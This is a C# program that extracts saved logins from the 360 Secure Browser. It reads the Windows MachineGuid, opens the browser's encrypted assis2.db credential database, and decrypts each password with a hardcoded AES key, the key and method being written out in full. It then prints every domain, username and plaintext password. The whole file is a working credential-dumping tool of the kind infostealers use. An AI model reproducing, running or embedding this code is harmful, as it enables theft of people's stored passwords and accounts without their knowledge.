using System;
using System.Data;
using System.Text;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Diagnostics;

namespace Safe360pwd
{

    public class common
    {

        public static string MachineGuid = get360safepass.getKey(@"SOFTWARE\Microsoft\Cryptography", "MachineGuid", 2);
        public static string BrowserPath = get360safepass.getKey(@"360SeSES\DefaultIcon", null, 0).Split(',')[0].Replace(@"360se6\Application\360se.exe", "") + @"360se6\";
        public static string DBPath = BrowserPath + @"User Data\Default\apps\LoginAssis\assis2.db";
        public static string DllPath = BrowserPath + @"Application\components\ExtYouxi\sqlitedb3.dll";

    }

    public class get360safepass
    {
        public static string getKey(string regeditPath, string regeditValue, int keyType)
        {
            string x64Result = string.Empty;
            string x86Result = string.Empty;
            string _values = string.Empty;
            try
            {

                RegistryKey keyBaseX64 = RegistryKey.OpenBaseKey(_hives[keyType], RegistryView.Registry64);
                RegistryKey keyBaseX86 = RegistryKey.OpenBaseKey(_hives[keyType], RegistryView.Registry32);
                RegistryKey keyX64 = keyBaseX64.OpenSubKey(regeditPath, RegistryKeyPermissionCheck.ReadSubTree);
                RegistryKey keyX86 = keyBaseX86.OpenSubKey(regeditPath, RegistryKeyPermissionCheck.ReadSubTree);
                object resultObjX64 = keyX64.GetValue(regeditValue, (object)"default");
                object resultObjX86 = keyX86.GetValue(regeditValue, (object)"default");
                keyX64.Close();
                keyX86.Close();
                keyBaseX64.Close();
                keyBaseX86.Close();
                keyX64.Dispose();
                keyX86.Dispose();
                keyBaseX64.Dispose();
                keyBaseX86.Dispose();
                keyX64 = null;
                keyX86 = null;
                keyBaseX64 = null;
                keyBaseX86 = null;
                if (resultObjX64 != null && resultObjX64.ToString() != "default")
                {
                    _values = resultObjX64.ToString();
                    return _values;
                }
                if (resultObjX86 != null && resultObjX86.ToString() != "default")
                {
                    _values = resultObjX86.ToString();
                    return _values;
                }
            }
            catch
            {
                Console.WriteLine("read key error");
            }
            return _values;
        }

        public static readonly RegistryHive[] _hives = new[]
        {
              RegistryHive.ClassesRoot,
              RegistryHive.CurrentUser,
              RegistryHive.LocalMachine,
              RegistryHive.Users,
              RegistryHive.PerformanceData,
              RegistryHive.CurrentConfig,
              RegistryHive.DynData
        };



        public static void Run()
        {


            //Console.WriteLine(common.BrowserPath + '\n' + common.DBPath + '\n' + common.DllPath);

            var pomocna = new get360safepass();
            //ResourceExtractor.ExtractResourceToFile("Safe360Browsergetpass.sqlite3.dll", "sqlite3.dll");
            String dbPath = null;
            String MachineGuid = null;
            //bool isAuto = true;

            //else if (args.Contains("/auto"))
            //{
            //isAuto = true;
            //}

            //if (isAuto)
            //{
            //   dbPath = common.DBPath;
            //   MachineGuid = common.MachineGuid;
            //}
            //if (dbPathArg=="" || MachineGuidArg == "")
            //{
            dbPath = common.DBPath;
            MachineGuid = common.MachineGuid;
            //}
            //else
            //{
            //    dbPath = dbPathArg;
            //    MachineGuid = MachineGuidArg;
            //}


            //Console.WriteLine("current DB {0}", common.DBPath);
            //Console.WriteLine("current MachineGuid {0}\n", MachineGuid);
            
            try
            { 
                DataTable bdata = pomocna.GetSqlite3De(dbPath, MachineGuid);
            

                foreach (DataRow dr in bdata.Rows)
                {
                    var _text = dr["password"].ToString().Replace("(4B01F200ED01)", "");
                    var passItem = pomocna.DecryptAes(_text);
                    StringBuilder _stringb = new StringBuilder();

                    if (passItem[0] == '\x02')
                    {
                        for (int p = 0; p < passItem.Length; p++)
                        {
                            if (p % 2 == 1)
                            {
                                _stringb.Append(passItem[p]);
                            }
                        }
                        dr["password"] = _stringb;
                    }
                    else
                    {
                        for (int p = 1; p < passItem.Length; p++)
                        {
                            if (p % 2 != 1)
                            {
                                _stringb.Append(passItem[p]);
                            }
                        }
                        dr["password"] = _stringb;
                    }
                }
                foreach (DataRow dr in bdata.Rows)
                {

                    Console.WriteLine("{0}  {1}  {2}", dr["domain"], dr["username"], dr["password"]);
                }
            }
            catch
            {

            }
        }

        public DataTable GetSqlite3De(String dbPath, String MachineGuid)
        {
            //int j = sqlite3_rekey(_db, newpassWord, newLength);

            SQLiteBase db = new SQLiteBase(dbPath, MachineGuid);
            var BrowserTable = db.ExecuteQuery("select * from tb_account");
            //foreach (DataRow dr in BrowserTable.Rows)
            //{
            //    Console.WriteLine("----------------");
            //    Console.WriteLine(dr["domain"]);
            //    Console.WriteLine(dr["username"]);
            //    Console.WriteLine(dr["password"]);
            //}
            return BrowserTable;
        }

        

        public string EncryptAes(string text)
        {

            byte[] src = Encoding.UTF8.GetBytes(text);
            byte[] key = Encoding.ASCII.GetBytes("cf66fb58f5ca3485");
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.PKCS7;
            aes.KeySize = 128;

            using (ICryptoTransform encrypt = aes.CreateEncryptor(key, null))
            {
                byte[] dest = encrypt.TransformFinalBlock(src, 0, src.Length);
                encrypt.Dispose();
                return Convert.ToBase64String(dest);
            }
        }

        public string DecryptAes(string text)
        {

            byte[] src = Convert.FromBase64String(text);
            RijndaelManaged aes = new RijndaelManaged();
            byte[] key = Encoding.ASCII.GetBytes("cf66fb58f5ca3485");
            aes.KeySize = 128;
            //aes.IV = Encoding.UTF8.GetBytes("cf66fb58f5ca3485");//
            //aes.Padding = PaddingMode.Zeros;//
            //aes.BlockSize = 128;//
            aes.Padding = PaddingMode.None;
            aes.Mode = CipherMode.ECB;
            using (ICryptoTransform decrypt = aes.CreateDecryptor(key, null))
            {
                byte[] dest = decrypt.TransformFinalBlock(src, 0, src.Length);
                decrypt.Dispose();
                return Encoding.UTF8.GetString(dest);
            }
        }



    }
}

public static class ResourceExtractor
{
    public static void ExtractResourceToFile(string resourceName, string filename)
    {
        if (!System.IO.File.Exists(filename))
            using (System.IO.Stream s = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            using (System.IO.FileStream fs = new System.IO.FileStream(filename, System.IO.FileMode.Create))
            {
                byte[] b = new byte[s.Length];
                s.Read(b, 0, b.Length);
                fs.Write(b, 0, b.Length);
            }
    }
}